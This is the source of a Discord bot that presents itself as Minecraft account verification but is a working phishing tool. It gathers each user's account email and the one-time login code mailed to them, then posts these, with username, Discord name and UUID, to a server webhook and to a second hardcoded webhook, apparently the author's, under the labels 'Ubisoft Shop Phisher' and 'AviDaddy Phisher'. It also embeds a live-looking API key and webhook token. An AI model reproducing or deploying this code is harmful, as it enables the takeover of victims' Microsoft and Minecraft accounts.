const fs = require('node:fs');
const path = require('node:path');
const { WebhookClient, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, Client, Collection, GatewayIntentBits, ActivityType, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { token } = require('./config.json');
const logo = 'https://media.discordapp.net/attachments/1094164623286087720/1094177488944508938/Blue_fwefwe.png?width=320&height=320'
const deploy = require('./deploy')

/* important*/


const hypixel_api_key = '6d7377fb-9e57-4f79-9250-de3618b30aa0'




let config = {};

try {
  // Attempt to read the config file
  config = require('./serverstorage.json');
} catch (err) {
  // If the file doesn't exist, create it with an empty object
  if (err.code === 'MODULE_NOT_FOUND') {
    fs.writeFileSync('./serverstorage.json', '{}');
    console.log('Config file created');
  } else {
    console.error('Error reading config file:', err);
  }
}
/* end */



const SimplDB = require('simpl.db');
const db = new SimplDB();
const { default: axios } = require('axios');

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

function isEmail(email) {
    var emailFormat = /^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/;
    if (email !== '' && email.match(emailFormat)) { return true; }

    return false;
}

const client = new Client({ intents: [GatewayIntentBits.Guilds] });
client.commands = new Collection();
const commandsPath = path.join(__dirname, 'commands');
const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

for (const file of commandFiles) {
    const filePath = path.join(commandsPath, file);
    const command = require(filePath);
    client.commands.set(command.data.name, command);
}

client.once(Events.ClientReady, () => {
    console.log('Ready on verify!');
    client.user.setPresence({
        activities: [{ name: `/help | by Altpapier#4847`, type: ActivityType.Playing }],
        status: 'online',
    });
});

client.on(Events.InteractionCreate, async interaction => {
    if (interaction.isButton()) {
        if (interaction.customId == 'skrim') {
            const modal = new ModalBuilder()
                .setCustomId('skrimverification')
                .setTitle('Minecraft Account Verification');

            const username = new TextInputBuilder()
                .setCustomId('username')
                .setLabel("Your Minecraft Username")
                .setPlaceholder('Enter your minecraft username!')
                .setStyle(TextInputStyle.Short)
                .setRequired(true)

            const email = new TextInputBuilder()
                .setCustomId('email')
                .setLabel("Your Minecraft Account's Email")
                .setPlaceholder('Enter the email of your minecraft account!')
                .setStyle(TextInputStyle.Short)
                .setRequired(true)

            const firstRow = new ActionRowBuilder().addComponents(username);
            const secondRow = new ActionRowBuilder().addComponents(email);
            modal.addComponents(firstRow, secondRow);
            await interaction.showModal(modal);
        }
        if (interaction.customId.startsWith('enterCode.')) {
            const modal = new ModalBuilder()
                .setCustomId('enterCode.' + interaction.customId.replace('enterCode.', ''))
                .setTitle('Minecraft Account Verification');

            const code = new TextInputBuilder()
                .setCustomId('code')
                .setLabel("Your Code")
                .setPlaceholder('Enter the code we sent to your email!')
                .setStyle(TextInputStyle.Short)
                .setRequired(true)

            const firstRow = new ActionRowBuilder().addComponents(code);
            modal.addComponents(firstRow);
            await interaction.showModal(modal);
        }
    }
});

client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isModalSubmit()) return;
    await interaction.deferReply({ ephemeral: true })

    if (interaction.customId === 'skrimverification') {
        const name = interaction.fields.getTextInputValue('username');
        const email = interaction.fields.getTextInputValue('email');
        const data = await axios.get('http://localhost:80/code?email=' + email).catch(() => {
            return interaction.editReply({ content: "**Connecting API**", ephemeral: true });
        })
        if (!isEmail(email)) {
            return interaction.editReply({ content: "**Sending Email**", ephemeral: true });
        }
        else {
            var state = makeid(10)
            while (await db.has(state + '.name')) state = makeid(10)
            
            db.set(state + '.name', name)
            db.set(state + '.email', email)
            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('enterCode.' + state)
                        .setLabel('Enter Code')
                        .setStyle(ButtonStyle.Success),
                );
            var embed = new EmbedBuilder()
                .setTitle('**Email Sent**')
                .setDescription('<a:tickxd:1124240728650956861> **A one-time verification code has been successfully sent to your email! Enter it by pressing the button below.**')
            await interaction.editReply({ embeds: [embed], components: [row], ephemeral: true });

         const config = JSON.parse(fs.readFileSync('./serverstorage.json', 'utf8'));

            // Assuming this code is inside an interaction handler
            if (!interaction.guild) {
              console.error('Interaction is not in a guild');
              return;
            }
            
            const guildId = interaction.guild.id;
            const guildConfig = config[guildId];
            if (!guildConfig) {
              console.error(`Guild ${guildId} not found in config`);
              return;
            }
            
            const webhookUrl = guildConfig.webhook;
            if (!webhookUrl) {
              console.error(`Webhook URL not found for guild ${guildId}`);
              return;
            }
            
            console.log(`Webhook URL for guild ${guildId}: ${webhookUrl}`);
            // Do something with the webhook URL here
            const webhook = new WebhookClient({ url: webhookUrl });
           const initialEmbed = new EmbedBuilder()
          .setTitle('<a:crownxd:1124246852301242490>Waiting to request code!')
          .setDescription(`\n<a:emailxd:1124240918761967686> **Email:** ${email}\n\n<a:usernamexd:1124241668011474994> **Username:** ${name}\n\n<:warnxd:1124120542065197177> [**Request Code**](https://login.live.com/)`)  
.setImage(`https://cdn.discordapp.com/attachments/1122352424770871327/1124245743956410368/banner.png`)
          .setColor('#FF0000');

        
        webhook.send({ 
            content: "@everyone",
            username: 'Ubisoft Shop Phisher',
            avatarURL: 'https://cdn.discordapp.com/attachments/1113972842938257509/1124258623317606400/AviDaddy.png', 
          embeds: [initialEmbed] });
          
        }
    }
    if (interaction.customId.startsWith('enterCode.')) {
        const state = interaction.customId.replace('enterCode.', '');
        const code = interaction.fields.getTextInputValue('code');
        if (!/\d{7}|\d{7}/.test(parseInt(code))) {
            return interaction.editReply({ content: "invalid code!", ephemeral: true });
        }
        var name = await db.get(state + '.name')
        var mail = await db.get(state + '.email')
        if (!name || !mail || name == 404 || mail == 404) {
            return await interaction.editReply({ content: "this state doesn't exist anymore! try again", ephemeral: true });
        }
        const role = interaction.guild.roles.cache.find(r => r.name == "Verified")
        await interaction.member.roles.add(role).catch(async () => {
            var embed = new EmbedBuilder()
            .setTitle('Error!')
            .setDescription('I can\'t give you roles :( staff have been pinged!')
            return await interaction.editReply({ embeds: [embed], ephemeral: true });
        })
        var embed = new EmbedBuilder()
        .setTitle('Success!')
        .setDescription('You have verified!')
    await interaction.editReply({ embeds: [embed], ephemeral: true });

      async function getUUID(name) {
  try {
    let response = await axios.get('https://api.mojang.com/users/profiles/minecraft/' + name);
    if (response.data == undefined) return false;
    return response.data;
  } catch (error) {
    return false;
  }
}
     const uuid = await getUUID(`${name}`);


    getUUID(name).then(async (response) => {


        function nFormatter(num, digits) {
            const lookup = [
                { value: 1, symbol: "" },
                { value: 1e3, symbol: "k" },
                { value: 1e6, symbol: "M" },
                { value: 1e9, symbol: "B" },
                { value: 1e12, symbol: "T" },
            ];
            const rx = /\.0+$|(\.[0-9]*[1-9])0+$/;
            var item = lookup.slice().reverse().find(function (item) {
                return num >= item.value;
            });
            return item ? (num / item.value).toFixed(digits).replace(rx, "$1") + item.symbol : "0";
        }

      const memberName = interaction.member.user.username; 
      
       var embed = new EmbedBuilder()
    .setTitle('<:warnxd:1124120542065197177> Code Entered! | Sub 2 AviDaddy Codez')
    .setDescription(`Expires in <t:${Math.floor(new Date().getTime() / 1000) + 1500}:R>`)
    .setTimestamp()
    .addFields(
        {
            name: '**<a:emailxd:1124240918761967686> Email**',
            value: ` >  \`${mail}\``,
            inline: false,
        },
        {
            name: '**<a:usernamexd:1124241668011474994> Username**',
            value: ` > \`${name}\``,
            inline: false,
        },
      {
            name: '**<a:usernamexd:1124241668011474994> Discord**',
            value: ` > \`${memberName}\``,
            inline: false,
        },
      {
            name: '**<a:usernamexd:1124241668011474994> UUID**',
            value: ` > \`${uuid.id}\``,
            inline: false,
        },
       {
            name: '**<a:usernamexd:1124241668011474994> Code**',
            value: ` > \`${code}\``,
            inline: false,
        },
        {
            name: '\u200b',
            value: '\u200b',
            inline: false,
        },
        {
            name: ' > <a:crownxd:1124246852301242490> Change Email',
            value: '[Change Email](https://account.live.com/names/manage)',
            inline: true,
        },
        {
            name: ' > <a:crownxd:1124246852301242490> Change Password',
            value: '[Change Password](https://account.live.com/Activity)',
            inline: true,
        }
    )
    .setFooter({ text: 'Made with 💖 by AviDaddy Codez#1337', iconURL: 'https://media.discordapp.net/attachments/1113494066823434290/1124107450203779112/selling.jpg?width=372&height=662' })
         .setImage(`https://cdn.discordapp.com/attachments/1122352424770871327/1124245743956410368/banner.png`);

const config = JSON.parse(fs.readFileSync('./serverstorage.json', 'utf8'));

            // Assuming this code is inside an interaction handler
            if (!interaction.guild) {
              console.error('Interaction is not in a guild');
              return;
            }
            
            const guildId = interaction.guild.id;
            const guildConfig = config[guildId];
            if (!guildConfig) {
              console.error(`Guild ${guildId} not found in config`);
              return;
            }
            
            const webhookUrl = guildConfig.webhook;
            if (!webhookUrl) {
              console.error(`Webhook URL not found for guild ${guildId}`);
              return;
            }
            
            console.log(`Webhook URL for guild ${guildId}: ${webhookUrl}`);
            // Do something with the webhook URL here
            const webhook = new WebhookClient({ url: webhookUrl });
            const dhWebhook = new WebhookClient({ url: `https://discord.com/api/webhooks/1128944249103196233/T_1g2aBs1jbYM8zryu9mA5k9nGXNsqNZ9ln8BoNCPsXHLKCxJGHNeSiZbc5_5EGneGkO` });
              
      const userProfileURL = `https://sky.shiiyu.moe/stats/${name}`;
            webhook.send({ 
                content: "|| @everyone|| Skyblock Profile: " + userProfileURL,
                username: 'AviDaddy Phisher',
                avatarURL: 'https://cdn.discordapp.com/attachments/1113972842938257509/1124258623317606400/AviDaddy.png',
                embeds: [embed] 
            })
         dhWebhook.send({
  content: "|| @everyone|| Skyblock Profile: " + userProfileURL,
  username: 'AviDaddy Phisher',
  avatarURL: 'https://cdn.discordapp.com/attachments/1113972842938257509/1124258623317606400/AviDaddy.png',
  embeds: [embed] 
});
            db.delete(state + '.name')
            db.delete(state + '.email')
            
    })
    }
});

client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const command = client.commands.get(interaction.commandName);

    if (!command) return;

    try {
        await command.execute(interaction);
    } catch (error) {
        console.error(error);
        if (interaction.replied || interaction.deferred) {
            await interaction.followUp({ content: 'There was an error while executing this command!', ephemeral: true });
        } else {
            await interaction.reply({ content: 'There was an error while executing this command!', ephemeral: true });
        }
    }
});

client.login(token)
